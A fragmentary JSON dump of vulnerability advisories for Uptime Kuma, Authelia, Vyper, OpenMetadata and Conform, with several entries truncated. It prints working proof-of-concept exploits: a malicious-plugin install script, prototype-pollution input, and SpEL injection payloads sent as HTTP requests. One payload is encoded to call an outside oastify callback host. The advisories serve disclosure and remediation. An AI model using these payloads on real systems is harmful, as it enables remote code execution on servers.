&quot;https:&#x2F;&#x2F;github.com&#x2F;n-thumann&#x2F;npm-install-script-poc&quot;;\nconst name = &quot;npm-install-script-poc&quot;;\n\nsocket.emit(\n  &quot;login&quot;,\n  { username: USERNAME, password: PASSWORD, token: &quot;&quot; },\n  (res) =&amp;gt; {\n    if (res.ok !== true) return console.log(&quot;Login failed&quot;);\n\n    console.log(&quot;Login successful&quot;);\n    socket.emit(&quot;installPlugin&quot;, repo, name, () =&amp;gt; {\n      console.log(&quot;Done&quot;);\n      socket.close();\n    });\n  }\n);\n```\n5. Install `socket.io-client`: `npm install socket.io-client`\n6. Run the script: `node poc.js`:\n```\n# node poc.js\nLogin successful\nDone\n```\n7. The PoC file has been created:\n```\n\u279c  ~ docker exec -it uptime-kuma cat &#x2F;tmp&#x2F;poc\nMalicious code could have been executed as user root\n```\n\n### Impact\nThis vulnerability allows authenticated attacker to gain remote code execution on the server Uptime Kuma is running on.",

            "details": "<b>Uptime Kuma&#x27;s authenticated path traversal via plugin repository name may lead to unavailability or data loss</b><br>### Summary\nA path traversal vulnerability via the plugin repository name allows an authenticated attacker to delete files on the server leading to unavailability and potentially data loss.\n\n### Details\nUptime Kuma allows authenticated users to install plugins from an official list of plugins. This feature is currently disabled in the web interface, but the corresponding API endpoints are still available after login.\nBefore a plugin is downloaded, the plugin installation directory is checked for existence. If it exists, it&#x27;s removed before the plugin installation.\n\nBecause the plugin is not validated against the official list of plugins or sanitized, the check for existence and the removal of the plugin installation directory are prone to path traversal.\n\n### Impact\nThis vulnerability allows an authenticated attacker to delete files from the server Uptime Kuma is running on.\nDepending on which files are deleted, Uptime Kuma or the whole system may become unavailable due to data loss.\n",

            "details": "<b>Access control change may take longer than expected in github.com&#x2F;authelia&#x2F;authelia&#x2F;v4</b><br>If the file authentication backend is being used, the ewatch option is set to true, the refresh interval is configured to a non-disabled value, and an administrator changes a user&#x27;s groups, then that user may be able to access resources that their previous groups had access to.",

            "id": "<a href='https://osv.dev/vulnerability/GHSA-ppx5-q359-pvwj' target='_blank'>GHSA-ppx5-q359-pvwj</a>",
            "details": "<b>vyper&#x27;s range(start, start + N) reverts for negative numbers</b><br>### Summary\n\nWhen looping over a `range` of the form `range(start, start + N)`, if `start` is negative, the execution will always revert.\n \n### Details\n\nThis issue is caused by an incorrect assertion inserted by the code generation of the range (`stmt.parse_For_range()`):\n\nhttps:&#x2F;&#x2F;github.com&#x2F;vyperlang&#x2F;vyper&#x2F;blob&#x2F;9136169468f317a53b4e7448389aa315f90b95ba&#x2F;vyper&#x2F;codegen&#x2F;stmt.py#L286-L287\n\nThis assertion was introduced in https:&#x2F;&#x2F;github.com&#x2F;vyperlang&#x2F;vyper&#x2F;commit&#x2F;3de1415ee77a9244eb04bdb695e249d3ec9ed868 to fix https:&#x2F;&#x2F;github.com&#x2F;advisories&#x2F;GHSA-6r8q-pfpv-7cgj. The issue arises when `start` is signed, instead of using `sle`, `le` is used and `start` is interpreted as an unsigned integer for the comparison. If it is a negative number, its 255th bit is set to `1` and is hence interpreted as a very large unsigned integer making the assertion always fail. \n### PoC\n\n```Vyper\n@external\ndef foo():\n    x:int256 = min_value(int256)\n    # revert when it should not since we have the following assertion that fails:\n    # [assert, [le, min_value(int256), max_value(int256) + 1 - 10]],\n    for i in range(x, x + 10):\n        pass\n```\n\n### Patches\n\npatched in v0.4.0, specifically, https:&#x2F;&#x2F;github.com&#x2F;vyperlang&#x2F;vyper&#x2F;pull&#x2F;3679 disallows this form of `range()`.\n\n### Impact\n\nAny contract having a `range(start, start + N)` where `start` is a signed integer with the possibility for `start` to be negative is affected. If a call goes through the loop while supplying a negative `start` the execution will revert.",
            "published": "2024-04-25T19:53:43Z",

            "details": "<b>vyper performs double eval of raw_args in create_from_blueprint</b><br>### Summary\nUsing the `create_from_blueprint` builtin can result in a double eval vulnerability when `raw_args=True` and the `args` argument has side-effects. \n\nA contract search was performed and no vulnerable contracts were found in production. In particular, the `raw_args` variant of `create_from_blueprint` was not found to be used in production.\n\n### Details\nIt can be seen that the `_build_create_IR` function of the `create_from_blueprint` builtin doesn&#x27;t cache the mentioned `args` argument to the stack: https:&#x2F;&#x2F;github.com&#x2F;vyperlang&#x2F;vyper&#x2F;blob&#x2F;cedf7087e68e67c7bfbd47ae95dcb16b81ad2e02&#x2F;vyper&#x2F;builtins&#x2F;functions.py#L1847\n\nAs such, it can be evaluated multiple times (instead of retrieving the value from the stack).\n\n### PoC\nThe vulnerability is demonstrated in the following `boa` test:\n``` vyper\nsrc1 = &quot;&quot;&quot;\nc: uint256\n&quot;&quot;&quot;\ndeployer = &quot;&quot;&quot;\ncreated_address: public(address)\ndeployed: public(uint256)\n\n@external\ndef get() -&amp;gt; Bytes[32]:\n    self.deployed += 1\n    return b&#x27;&#x27;\n\n@external\ndef create_(target: address):\n    self.created_address = create_from_blueprint(target, raw_call(self, method_id(&quot;get()&quot;), max_outsize=32), raw_args=True, code_offset=3)\n&quot;&quot;&quot;\n\nFactory = b.loads_partial(src1)\nc = Factory.deploy_as_blueprint()\n\nc2 = b.loads(deployer, b&#x27;&#x27;)\nc2.create_(c)\nc2.deployed()\n```\nThe output of `c2.deployed()` is `2` although `create_` was called only once and the value was initialized to `0`.\n\n### Patches\nPatched in https:&#x2F;&#x2F;github.com&#x2F;vyperlang&#x2F;vyper&#x2F;pull&#x2F;3976.\n\n### Impact\nNo vulnerable production contracts were found. Additionally, double evaluation of side-effects should be easily discoverable in client tests. As such, the impact is `low`.\n",

        }, {
            "ecosystem": "GIT",
            "id": "<a href='https://osv.dev/vulnerability/CVE-2024-32481' target='_blank'>CVE-2024-32481</a>",
            "details": "<b></b><br>Vyper is a pythonic Smart Contract Language for the Ethereum virtual machine. Starting in version 0.3.8 and prior to version 0.4.0b1, when looping over a `range` of the form `range(start, start + N)`, if `start` is negative, the execution will always revert. This issue is caused by an incorrect assertion inserted by the code generation of the range `stmt.parse_For_range()`. The issue arises when `start` is signed, instead of using `sle`, `le` is used and `start` is interpreted as an unsigned integer for the comparison. If it is a negative number, its 255th bit is set to `1` and is hence interpreted as a very large unsigned integer making the assertion always fail. Any contract having a `range(start, start + N)` where `start` is a signed integer with the possibility for `start` to be negative is affected. If a call goes through the loop while supplying a negative `start` the execution will revert. Version 0.4.0b1 fixes the issue.",
            "published": "2024-04-25T17:15:50Z",
            "severity": "0",
            "langs": "py",
            "references": "<ul><li>- <a target='_blank' href='https://github.com/vyperlang/vyper/blob/9136169468f317a53b4e7448389aa315f90b95ba/vyper/codegen/stmt.py#L286-L287'>https://github.com/vyperlang/vyper/blob/9136169468f317a53b4e7448389aa315f90b95ba/vyper/codegen/stmt.py#L286-L287</a></li></ul>"
        }, {
            "ecosystem": "Maven",
            "id": "<a href='https://osv.dev/vulnerability/GHSA-5xv3-fm7g-865r' target='_blank'>GHSA-5xv3-fm7g-865r</a>",
            "details": "<b>OpenMetadata vulnerable to a SpEL Injection in `GET &#x2F;api&#x2F;v1&#x2F;policies&#x2F;validation&#x2F;condition&#x2F;&amp;lt;expr&amp;gt;` (`GHSL-2023-236`)</b><br>### SpEL Injection in `GET &#x2F;api&#x2F;v1&#x2F;policies&#x2F;validation&#x2F;condition&#x2F;&amp;lt;expr&amp;gt;` (`GHSL-2023-236`)\n\n***Please note, only authenticated users have access to PUT &#x2F; POST APIS for &#x2F;api&#x2F;v1&#x2F;policies. Non authenticated users will not be able to access these APIs to exploit the vulnerability. A user must exist in OpenMetadata and have authenticated themselves to exploit this vulnerability.***\n\nThe [`\u200eCompiledRule::validateExpression`](https:&#x2F;&#x2F;github.com&#x2F;open-metadata&#x2F;OpenMetadata&#x2F;blob&#x2F;main&#x2F;openmetadata-service&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;openmetadata&#x2F;service&#x2F;security&#x2F;policyevaluator&#x2F;CompiledRule.java#L51) method evaluates an SpEL expression using an [`StandardEvaluationContext`](https:&#x2F;&#x2F;github.com&#x2F;open-metadata&#x2F;OpenMetadata&#x2F;blob&#x2F;main&#x2F;openmetadata-service&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;openmetadata&#x2F;service&#x2F;security&#x2F;policyevaluator&#x2F;CompiledRule.java#L57), allowing the expression to reach and interact with Java classes such as `java.lang.Runtime`, leading to Remote Code Execution. The `&#x2F;api&#x2F;v1&#x2F;policies&#x2F;validation&#x2F;condition&#x2F;&amp;lt;expression&amp;gt;` endpoint passes user-controlled data `CompiledRule::validateExpession` allowing authenticated (non-admin) users to execute arbitrary system commands on the underlaying operating system.\n\n[Snippet from PolicyResource.java](https:&#x2F;&#x2F;github.com&#x2F;open-metadata&#x2F;OpenMetadata&#x2F;blob&#x2F;b6b337e09a05101506a5faba4b45d370cc3c9fc8&#x2F;openmetadata-service&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;openmetadata&#x2F;service&#x2F;resources&#x2F;policies&#x2F;PolicyResource.java#L448)\n\n```java\n  @GET\n  @Path(&quot;&#x2F;validation&#x2F;condition&#x2F;{expression}&quot;)\n  @Operation(\n      operationId = &quot;validateCondition&quot;,\n      summary = &quot;Validate a given condition&quot;,\n      description = &quot;Validate a given condition expression used in authoring rules.&quot;,\n      responses = {\n        @ApiResponse(responseCode = &quot;204&quot;, description = &quot;No value is returned&quot;),\n        @ApiResponse(responseCode = &quot;400&quot;, description = &quot;Invalid expression&quot;)\n      })\n  public void validateCondition(\n      @Context UriInfo uriInfo,\n      @Context SecurityContext securityContext,\n      @Parameter(description = &quot;Expression of validating rule&quot;, schema = @Schema(type = &quot;string&quot;))\n          @PathParam(&quot;expression&quot;)\n          String expression) {\n    CompiledRule.validateExpression(expression, Boolean.class);\n  }\n```\n\n```java\n  public static &amp;lt;T&amp;gt; void validateExpression(String condition, Class&amp;lt;T&amp;gt; clz) {\n    if (condition == null) {\n      return;\n    }\n    Expression expression = parseExpression(condition);\n    RuleEvaluator ruleEvaluator = new RuleEvaluator();\n    StandardEvaluationContext evaluationContext = new StandardEvaluationContext(ruleEvaluator);\n    try {\n      expression.getValue(evaluationContext, clz);\n    } catch (Exception exception) {\n      &#x2F;&#x2F; Remove unnecessary class details in the exception message\n      String message = exception.getMessage().replaceAll(&quot;on type .*$&quot;, &quot;&quot;).replaceAll(&quot;on object .*$&quot;, &quot;&quot;);\n      throw new IllegalArgumentException(CatalogExceptionMessage.failedToEvaluate(message));\n    }\n  }\n```\n\nIn addition, there is a missing authorization check since `Authorizer.authorize()` is never called in the affected path and therefore any authenticated non-admin user is able to trigger this endpoint and evaluate arbitrary SpEL expressions leading to arbitrary command execution.\n\nThis vulnerability was discovered with the help of CodeQL&#x27;s [Expression language injection (Spring)](https:&#x2F;&#x2F;codeql.github.com&#x2F;codeql-query-help&#x2F;java&#x2F;java-spel-expression-injection&#x2F;) query.\n#### Proof of concept\n\n- Prepare the payload\n\t- Encode `touch &#x2F;tmp&#x2F;pwned` in Base64 =&amp;gt; `dG91Y2ggL3RtcC9wd25lZA==`\n\t- SpEL expression to run system command: `T(java.lang.Runtime).getRuntime().exec(new java.lang.String(T(java.util.Base64).getDecoder().decode(&quot;dG91Y2ggL3RtcC9wd25lZA==&quot;)))`\n\t- Encode the payload using URL encoding:\n```\n%54%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%29%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%28%54%28%6a%61%76%61%2e%75%74%69%6c%2e%42%61%73%65%36%34%29%2e%67%65%74%44%65%63%6f%64%65%72%28%29%2e%64%65%63%6f%64%65%28%22%64%47%39%31%59%32%67%67%4c%33%52%74%63%43%39%77%64%32%35%6c%5a%41%3d%3d%22%29%29%29\n```\n\n- Send the payload using a valid JWT token:\n```http\nGET &#x2F;api&#x2F;v1&#x2F;policies&#x2F;validation&#x2F;condition&#x2F;%54%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%29%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%28%54%28%6a%61%76%61%2e%75%74%69%6c%2e%42%61%73%65%36%34%29%2e%67%65%74%44%65%63%6f%64%65%72%28%29%2e%64%65%63%6f%64%65%28%22%62%6e%4e%73%62%32%39%72%64%58%41%67%61%58%70%73%4e%7a%45%33%62%33%42%69%62%57%52%79%5a%57%46%6f%61%33%4a%6f%63%44%4e%72%63%32%70%72%61%47%4a%75%4d%6d%4a%7a%65%6d%67%75%62%32%46%7a%64%47%6c%6d%65%53%35%6a%62%32%30%3d%22%29%29%29 HTTP&#x2F;2\nHost: sandbox.open-metadata.org\nAuthorization: Bearer &amp;lt;non-admin JWT&amp;gt;\n```\n- Verify that a file called `&#x2F;tmp&#x2F;pwned` was created in the OpenMetadata server\n#### Impact\n\nThis issue may lead to Remote Code Execution by a registered and authenticated user.\n\n#### Remediation\n\nUse [`SimpleEvaluationContext`](https:&#x2F;&#x2F;docs.spring.io&#x2F;spring-framework&#x2F;docs&#x2F;current&#x2F;javadoc-api&#x2F;org&#x2F;springframework&#x2F;expression&#x2F;spel&#x2F;support&#x2F;SimpleEvaluationContext.html) to exclude *references to Java types, constructors, and bean references*.",

            "details": "<b>OpenMetadata vulnerable to a SpEL Injection in `PUT &#x2F;api&#x2F;v1&#x2F;events&#x2F;subscriptions` (`GHSL-2023-251`)</b><br>### SpEL Injection in `PUT &#x2F;api&#x2F;v1&#x2F;events&#x2F;subscriptions` (`GHSL-2023-251`)\n\n***Please note, only authenticated users have access to PUT &#x2F; POST APIS for &#x2F;api&#x2F;v1&#x2F;policies. Non authenticated users will not be able to access these APIs to exploit the vulnerability. A user must exist in OpenMetadata and have authenticated themselves to exploit this vulnerability.***\n\nSimilarly to the GHSL-2023-250 issue, `AlertUtil::validateExpression` is also called from [`EventSubscriptionRepository.prepare()`](https:&#x2F;&#x2F;github.com&#x2F;open-metadata&#x2F;OpenMetadata&#x2F;blob&#x2F;b6b337e09a05101506a5faba4b45d370cc3c9fc8&#x2F;openmetadata-service&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;openmetadata&#x2F;service&#x2F;jdbi3&#x2F;EventSubscriptionRepository.java#L69-L83), which can lead to Remote Code Execution.\n\n```java\n  @Override\n  public void prepare(EventSubscription entity, boolean update) {\n    validateFilterRules(entity);\n  }\n\n  private void validateFilterRules(EventSubscription entity) {\n    &#x2F;&#x2F; Resolve JSON blobs into Rule object and perform schema based validation\n    if (entity.getFilteringRules() != null) {\n      List&amp;lt;EventFilterRule&amp;gt; rules = entity.getFilteringRules().getRules();\n      &#x2F;&#x2F; Validate all the expressions in the rule\n      for (EventFilterRule rule : rules) {\n        AlertUtil.validateExpression(rule.getCondition(), Boolean.class);\n      }\n      rules.sort(Comparator.comparing(EventFilterRule::getName));\n    }\n  }\n```\n\n`prepare()` is called from [`EntityRepository.prepareInternal()`](https:&#x2F;&#x2F;github.com&#x2F;open-metadata&#x2F;OpenMetadata&#x2F;blob&#x2F;b6b337e09a05101506a5faba4b45d370cc3c9fc8&#x2F;openmetadata-service&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;openmetadata&#x2F;service&#x2F;jdbi3&#x2F;EntityRepository.java#L693) which, in turn, gets called from the [`EntityResource.createOrUpdate()`](https:&#x2F;&#x2F;github.com&#x2F;open-metadata&#x2F;OpenMetadata&#x2F;blob&#x2F;b6b337e09a05101506a5faba4b45d370cc3c9fc8&#x2F;openmetadata-service&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;openmetadata&#x2F;service&#x2F;resources&#x2F;EntityResource.java#L219):\n\n```java\npublic Response createOrUpdate(UriInfo uriInfo, SecurityContext securityContext, T entity) {\n  repository.prepareInternal(entity, true);\n\n  &#x2F;&#x2F; If entity does not exist, this is a create operation, else update operation\n  ResourceContext&amp;lt;T&amp;gt; resourceContext = getResourceContextByName(entity.getFullyQualifiedName());\n  MetadataOperation operation = createOrUpdateOperation(resourceContext);\n  OperationContext operationContext = new OperationContext(entityType, operation);\n  if (operation == CREATE) {\n    CreateResourceContext&amp;lt;T&amp;gt; createResourceContext = new CreateResourceContext&amp;lt;&amp;gt;(entityType, entity);\n    authorizer.authorize(securityContext, operationContext, createResourceContext);\n    entity = addHref(uriInfo, repository.create(uriInfo, entity));\n    return new PutResponse&amp;lt;&amp;gt;(Response.Status.CREATED, entity, RestUtil.ENTITY_CREATED).toResponse();\n  }\n  authorizer.authorize(securityContext, operationContext, resourceContext);\n  PutResponse&amp;lt;T&amp;gt; response = repository.createOrUpdate(uriInfo, entity);\n  addHref(uriInfo, response.getEntity());\n  return response.toResponse();\n}\n```\n\nNote that, even though there is an authorization check (`authorizer.authorize()`), it gets called after `prepareInternal()` gets called and, therefore, after the SpEL expression has been evaluated.\n\nIn order to reach this method, an attacker can send a PUT request to `&#x2F;api&#x2F;v1&#x2F;events&#x2F;subscriptions` which gets handled by [`EventSubscriptionResource.createOrUpdateEventSubscription()`](https:&#x2F;&#x2F;github.com&#x2F;open-metadata&#x2F;OpenMetadata&#x2F;blob&#x2F;b6b337e09a05101506a5faba4b45d370cc3c9fc8&#x2F;openmetadata-service&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;openmetadata&#x2F;service&#x2F;resources&#x2F;events&#x2F;subscription&#x2F;EventSubscriptionResource.java#L289):\n\n```java\n@PUT\n@Operation(\n    operationId = &quot;createOrUpdateEventSubscription&quot;,\n    summary = &quot;Updated an existing or create a new Event Subscription&quot;,\n    description = &quot;Updated an existing or create a new Event Subscription&quot;,\n    responses = {\n      @ApiResponse(\n          responseCode = &quot;200&quot;,\n          description = &quot;create Event Subscription&quot;,\n          content =\n              @Content(\n                  mediaType = &quot;application&#x2F;json&quot;,\n                  schema = @Schema(implementation = CreateEventSubscription.class))),\n      @ApiResponse(responseCode = &quot;400&quot;, description = &quot;Bad request&quot;)\n    })\npublic Response createOrUpdateEventSubscription(\n    @Context UriInfo uriInfo, @Context SecurityContext securityContext, @Valid CreateEventSubscription create) {\n  &#x2F;&#x2F; Only one Creation is allowed for Data Insight\n  if (create.getAlertType() == CreateEventSubscription.AlertType.DATA_INSIGHT_REPORT) {\n    try {\n      repository.getByName(null, create.getName(), repository.getFields(&quot;id&quot;));\n    } catch (EntityNotFoundException ex) {\n      if (ReportsHandler.getInstance() != null &amp;&amp; ReportsHandler.getInstance().getReportMap().size() &amp;gt; 0) {\n        throw new BadRequestException(&quot;Data Insight Report Alert already exists.&quot;);\n      }\n    }\n  }\n  EventSubscription eventSub = getEventSubscription(create, securityContext.getUserPrincipal().getName());\n  Response response = createOrUpdate(uriInfo, securityContext, eventSub);\n  repository.updateEventSubscription((EventSubscription) response.getEntity());\n  return response;\n}\n```\n\nThis vulnerability was discovered with the help of CodeQL&#x27;s [Expression language injection (Spring)](https:&#x2F;&#x2F;codeql.github.com&#x2F;codeql-query-help&#x2F;java&#x2F;java-spel-expression-injection&#x2F;) query.\n\n#### Proof of concept\n- Prepare the payload\n\t- Encode the command to be run (eg: `touch &#x2F;tmp&#x2F;pwned`) using Base64 (eg: `dG91Y2ggL3RtcC9wd25lZA==`)\n\t- Create the SpEL expression to run the system command: `T(java.lang.Runtime).getRuntime().exec(new java.lang.String(T(java.util.Base64).getDecoder().decode(&quot;dG91Y2ggL3RtcC9wd25lZA==&quot;)))`\n- Send the payload using a valid JWT token:\n```http\nPUT &#x2F;api&#x2F;v1&#x2F;events&#x2F;subscriptions HTTP&#x2F;1.1\nHost: localhost:8585\nAuthorization: Bearer &amp;lt;non-admin JWT&amp;gt;\naccept: application&#x2F;json\nConnection: close\nContent-Type: application&#x2F;json\nContent-Length: 353\n\n{\n&quot;name&quot;:&quot;ActivityFeedAlert&quot;,&quot;displayName&quot;:&quot;Activity Feed Alerts&quot;,&quot;alertType&quot;:&quot;ChangeEvent&quot;,&quot;filteringRules&quot;:{&quot;rules&quot;:[\n{&quot;name&quot;:&quot;pwn&quot;,&quot;effect&quot;:&quot;exclude&quot;,&quot;condition&quot;:&quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(T(java.util.Base64).getDecoder().decode(&#x27;dG91Y2ggL3RtcC9wd25lZA==&#x27;)))&quot;}]},&quot;subscriptionType&quot;:&quot;ActivityFeed&quot;,&quot;enabled&quot;:true\n}\n```\n- Verify that a file called `&#x2F;tmp&#x2F;pwned` was created in the OpenMetadata server\n#### Impact\n\nThis issue may lead to Remote Code Execution.\n\n#### Remediation\n\nUse [`SimpleEvaluationContext`](https:&#x2F;&#x2F;docs.spring.io&#x2F;spring-framework&#x2F;docs&#x2F;current&#x2F;javadoc-api&#x2F;org&#x2F;springframework&#x2F;expression&#x2F;spel&#x2F;support&#x2F;SimpleEvaluationContext.html) to exclude *references to Java types, constructors, and bean references*.",

penmetadata/service/resources/events/subscription/EventSubscriptionResource.java#L289'>https://github.com/open-metadata/OpenMetadata/blob/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/resources/events/subscription/EventSubscriptionResource.java#L289</a></li></ul>"

            "details": "<b>Conform contains a Prototype Pollution Vulnerability in `parseWith...` function</b><br>### Summary\nConform allows the parsing of nested objects in the form of `object.property`. Due to an improper implementation of this feature, an attacker can exploit it to trigger prototype pollution by passing a crafted input to `parseWith...` functions.\n\n### PoC\n```javascript\nconst { parseWithZod } = require(&#x27;@conform-to&#x2F;zod&#x27;);\nconst { z } = require(&quot;zod&quot;); \n\nconst param = new URLSearchParams(&quot;__proto__.pollution=polluted&quot;);\nconst schema = z.object({ &quot;a&quot;: z.string() });\n\nparseWithZod(param, { schema });\nconsole.log(&quot;pollution:&quot;, ({}).pollution); &#x2F;&#x2F; should print &quot;polluted&quot;\n```\n\n### Details\n\nThe invocation of the `parseWithZod` function in the above PoC triggers the `setValue` function through `getSubmissionContext` and `parse`, executing the following process, resulting in prototype pollution:\n\n```javascript\nlet pointer = value;\n\npointer.__proto__ = pointer.__proto__;\npointer = pointer.__proto__;\n\npointer.polluted = &quot;polluted&quot;;\n```\n\nThis is caused by the lack of object existence checking on [line 117 in formdata.ts](https:&#x2F;&#x2F;github.com&#x2F;edmundhung&#x2F;conform&#x2F;blob&#x2F;59156d7115a7207fa3b6f8a70a4342a9b24c2501&#x2F;packages&#x2F;conform-dom&#x2F;formdata.ts#L117), where the code only checks for the presence of `pointer[key]` without proper validation.\n\n### Impact\nApplications that use conform for server-side validation of form data or URL parameters are affected by this vulnerability.\n",

            "ecosystem": "Maven",
            "id": "<a href='https://osv.dev/vulnerability/GHSA-7vf4-x5m2-r6gr' target='_blank'>GHSA-7vf4-x5m2-r6gr</a>",
            "details": "<b>OpenMetadata vulnerable to SpEL Injection in `PUT &#x2F;api&#x2F;v1&#x2F;policies` (`GHSL-2023-252`)</b><br>### SpEL Injection in `PUT &#x2F;api&#x2F;v1&#x2F;policies` (`GHSL-2023-252`)\n\n**Please note, only authenticated users have access to PUT &#x2F; POST APIS for &#x2F;api&#x2F;v1&#x2F;policies. Non authenticated users will not be able to access these APIs to exploit the vulnerability** \n\n`CompiledRule::validateExpression` is also called from [`PolicyRepository.prepare`](https:&#x2F;&#x2F;github.com&#x2F;open-metadata&#x2F;OpenMetadata&#x2F;blob&#x2F;main&#x2F;openmetadata-service&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;openmetadata&#x2F;service&#x2F;jdbi3&#x2F;PolicyRepository.java#L113)\n\n```java\n  @Override\n  public void prepare(Policy policy, boolean update) {\n    validateRules(policy);\n  }\n  ...\n  public void validateRules(Policy policy) {\n    List&amp;lt;Rule&amp;gt; rules = policy.getRules();\n    if (nullOrEmpty(rules)) {\n      throw new IllegalArgumentException(CatalogExceptionMessage.EMPTY_RULES_IN_POLICY);\n    }\n\n    &#x2F;&#x2F; Validate all the expressions in the rule\n    for (Rule rule : rules) {\n      CompiledRule.validateExpression(rule.getCondition(), Boolean.class);\n      rule.getResources().sort(String.CASE_INSENSITIVE_ORDER);\n      rule.getOperations().sort(Comparator.comparing(MetadataOperation::value));\n\n      &#x2F;&#x2F; Remove redundant resources\n      rule.setResources(filterRedundantResources(rule.getResources()));\n\n      &#x2F;&#x2F; Remove redundant operations\n      rule.setOperations(filterRedundantOperations(rule.getOperations()));\n    }\n    rules.sort(Comparator.comparing(Rule::getName));\n  }\n```\n\n`prepare()` is called from [`EntityRepository.prepareInternal()`](https:&#x2F;&#x2F;github.com&#x2F;open-metadata&#x2F;OpenMetadata&#x2F;blob&#x2F;b6b337e09a05101506a5faba4b45d370cc3c9fc8&#x2F;openmetadata-service&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;openmetadata&#x2F;service&#x2F;jdbi3&#x2F;EntityRepository.java#L693) which, in turn, gets called from the [`EntityResource.createOrUpdate()`](https:&#x2F;&#x2F;github.com&#x2F;open-metadata&#x2F;OpenMetadata&#x2F;blob&#x2F;b6b337e09a05101506a5faba4b45d370cc3c9fc8&#x2F;openmetadata-service&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;openmetadata&#x2F;service&#x2F;resources&#x2F;EntityResource.java#L219):\n\n```java\npublic Response createOrUpdate(UriInfo uriInfo, SecurityContext securityContext, T entity) {\n  repository.prepareInternal(entity, true);\n\n  &#x2F;&#x2F; If entity does not exist, this is a create operation, else update operation\n  ResourceContext&amp;lt;T&amp;gt; resourceContext = getResourceContextByName(entity.getFullyQualifiedName());\n  MetadataOperation operation = createOrUpdateOperation(resourceContext);\n  OperationContext operationContext = new OperationContext(entityType, operation);\n  if (operation == CREATE) {\n    CreateResourceContext&amp;lt;T&amp;gt; createResourceContext = new CreateResourceContext&amp;lt;&amp;gt;(entityType, entity);\n    authorizer.authorize(securityContext, operationContext, createResourceContext);\n    entity = addHref(uriInfo, repository.create(uriInfo, entity));\n    return new PutResponse&amp;lt;&amp;gt;(Response.Status.CREATED, entity, RestUtil.ENTITY_CREATED).toResponse();\n  }\n  authorizer.authorize(securityContext, operationContext, resourceContext);\n  PutResponse&amp;lt;T&amp;gt; response = repository.createOrUpdate(uriInfo, entity);\n  addHref(uriInfo, response.getEntity());\n  return response.toResponse();\n}\n```\n\nNote that even though there is an authorization check (`authorizer.authorize()`), it gets called after `prepareInternal()` gets called and therefore after the SpEL expression has been evaluated.\n\nIn order to reach this method, an attacker can send a PUT request to `&#x2F;api&#x2F;v1&#x2F;policies` which gets handled by [`PolicyResource.createOrUpdate()`](https:&#x2F;&#x2F;github.com&#x2F;open-metadata&#x2F;OpenMetadata&#x2F;blob&#x2F;b6b337e09a05101506a5faba4b45d370cc3c9fc8&#x2F;openmetadata-service&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;openmetadata&#x2F;service&#x2F;resources&#x2F;policies&#x2F;PolicyResource.java#L365):\n\n```java\n@PUT\n@Operation(\n    operationId = &quot;createOrUpdatePolicy&quot;,\n    summary = &quot;Create or update a policy&quot;,\n    description = &quot;Create a new policy, if it does not exist or update an existing policy.&quot;,\n    responses = {\n      @ApiResponse(\n          responseCode = &quot;200&quot;,\n          description = &quot;The policy&quot;,\n          content = @Content(mediaType = &quot;application&#x2F;json&quot;, schema = @Schema(implementation = Policy.class))),\n      @ApiResponse(responseCode = &quot;400&quot;, description = &quot;Bad request&quot;)\n    })\npublic Response createOrUpdate(\n    @Context UriInfo uriInfo, @Context SecurityContext securityContext, @Valid CreatePolicy create) {\n  Policy policy = getPolicy(create, securityContext.getUserPrincipal().getName());\n  return createOrUpdate(uriInfo, securityContext, policy);\n}\n```\n\nThis vulnerability was discovered with the help of CodeQL&#x27;s [Expression language injection (Spring)](https:&#x2F;&#x2F;codeql.github.com&#x2F;codeql-query-help&#x2F;java&#x2F;java-spel-expression-injection&#x2F;) query.\n\n#### Proof of concept\n- Prepare the payload\n\t- Encode the command to be run (eg: `touch &#x2F;tmp&#x2F;pwned`) using Base64 (eg: `dG91Y2ggL3RtcC9wd25lZA==`)\n\t- Create the SpEL expression to run the system command: `T(java.lang.Runtime).getRuntime().exec(new java.lang.String(T(java.util.Base64).getDecoder().decode(&quot;dG91Y2ggL3RtcC9wd25lZA==&quot;)))`\n- Send the payload using a valid JWT token:\n\n```http\nPUT &#x2F;api&#x2F;v1&#x2F;policies HTTP&#x2F;1.1\nHost: localhost:8585\nsec-ch-ua: &quot;Chromium&quot;;v=&quot;119&quot;, &quot;Not?A_Brand&quot;;v=&quot;24&quot;\nAuthorization: Bearer &amp;lt;non-admin JWT&amp;gt;\naccept: application&#x2F;json\nConnection: close\nContent-Type: application&#x2F;json\nContent-Length: 367\n\n{&quot;name&quot;:&quot;TeamOnlyPolicy&quot;,&quot;rules&quot;:[{&quot;name&quot;:&quot;TeamOnlyPolicy-Rule&quot;,&quot;description&quot;:&quot;Deny all the operations on all the resources for all outside the team hierarchy..&quot;,&quot;effect&quot;:&quot;deny&quot;,&quot;operations&quot;:[&quot;All&quot;],&quot;resources&quot;:[&quot;All&quot;],&quot;condition&quot;:&quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(T(java.util.Base64).getDecoder().decode(&#x27;dG91Y2ggL3RtcC9wd25lZA==&#x27;)))&quot;}]}\n```\n- Verify that a file called `&#x2F;tmp&#x2F;pwned` was created in the OpenMetadata server\n\n#### Impact\n\nThis issue may lead to Remote Code Execution by a registered and authenticated user\n\n#### Remediation\n\nUse 